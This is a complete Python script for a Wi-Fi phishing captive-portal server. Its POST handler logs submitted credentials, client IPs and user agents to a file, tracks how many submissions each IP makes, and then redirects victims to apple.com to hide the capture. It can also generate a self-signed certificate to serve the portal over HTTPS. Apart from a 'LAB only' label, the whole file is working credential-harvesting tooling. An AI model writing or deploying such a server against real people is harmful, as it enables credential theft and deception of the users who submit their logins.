#!/usr/bin/env python3
import os
import sys
import ssl
import urllib.parse
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime
from collections import defaultdict

ERROR_LOG = "server_errors.log"
CRED_LOG = "captured_creds.txt"
STATS_LOG = "stats.log"
HTTPS_CERT = "selfsigned.crt"
HTTPS_KEY = "selfsigned.key"
REDIRECT_URL = "https://apple.com/"  

POST_COUNT = 0
PER_IP = defaultdict(int)

def log_error(msg):
    print(msg.strip())
    with open(ERROR_LOG, "a") as f:
        f.write(f"{datetime.now()} | {msg.strip()}\n")

def incr_stats(client_ip):
    global POST_COUNT
    POST_COUNT += 1
    PER_IP[client_ip] += 1
    with open(STATS_LOG, "a") as f:
        f.write(f"{datetime.now()} | {client_ip} | total_posts={POST_COUNT} | per_ip={PER_IP[client_ip]}\n")

class PhishHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        global POST_COUNT, PER_IP
        length = int(self.headers['Content-Length'])
        post = self.rfile.read(length).decode("utf-8")
        creds = urllib.parse.parse_qs(post)
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "")
        try:
            with open(CRED_LOG, "a") as f:
                f.write(f"{datetime.now()} | {client_ip} | {user_agent} | {creds}\n")
            incr_stats(client_ip)
        except Exception as e:
            log_error(f"[!] Disk write error: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"<html><body><h2>Error: Could not log credentials! Try again later.</h2></body></html>")
            return
        # Redirect to legit site after POST
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()

    def log_message(self, *args): pass

def check_root():
    if os.geteuid() != 0:
        msg = "[!] ERROR: You must run this server as root (sudo) to use port 80 or 443."
        log_error(msg)
        sys.exit(1)

def check_python3():
    if sys.version_info[0] < 3:
        msg = "[!] ERROR: This server requires Python 3."
        log_error(msg)
        sys.exit(1)

def gen_selfsigned_cert():
    from subprocess import Popen, PIPE
    if not (os.path.exists(HTTPS_CERT) and os.path.exists(HTTPS_KEY)):
        print("[-] Generating self-signed cert for HTTPS...")
        subj = "/C=XX/ST=Nowhere/L=WiFi/O=Hotspot/CN=portal"
        cmd = ["openssl","req","-x509","-nodes","-newkey","rsa:2048","-keyout",HTTPS_KEY,"-out",HTTPS_CERT,"-days","365","-subj",subj]
        Popen(cmd, stdout=PIPE, stderr=PIPE).communicate()
        print("[*] Created self-signed certs.")

def run_server(port=80, use_https=False):
    httpd = ThreadingHTTPServer(('', port), PhishHandler)
    if use_https:
        gen_selfsigned_cert()
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=HTTPS_CERT, keyfile=HTTPS_KEY)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    proto = "https" if use_https else "http"
    print(f"[*] Phishing portal server running on {proto}://0.0.0.0:{port}")
    try:
        httpd.serve_forever()
    except OSError as e:
        if "Address already in use" in str(e):
            log_error("[!] ERROR: Port in use. Kill other web servers/processes.")
        elif "Permission denied" in str(e):
            log_error("[!] ERROR: Need root privileges. Please use sudo.")
        else:
            log_error(f"[!] Unhandled OSError: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[+] Server stopped by user.")
        sys.exit(0)
    except Exception as e:
        log_error(f"[!] Unhandled exception: {e}")
        raise

def main():
    import argparse
    import time
    parser = argparse.ArgumentParser(description="WiFi phishing portal (LAB only)")
    parser.add_argument('--https', action="store_true", help="Serve on 443/HTTPS with self-signed cert.")
    args = parser.parse_args()

    check_python3()
    check_root()
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    port = 443 if args.https else 80
    proto = "HTTPS" if args.https else "HTTP"
    print(f"[*] Starting phishing portal server on {proto} (port {port}).")
    while True:
        try:
            run_server(port=port, use_https=args.https)
        except Exception as crash:
            log_error(f"Server crashed: {crash}. Cooling down for 120 seconds...")
            print(f"[!] Server crashed! See {ERROR_LOG}. Retrying in 2 min...")
            time.sleep(120)
        else:
            break

if __name__ == '__main__':
    main()
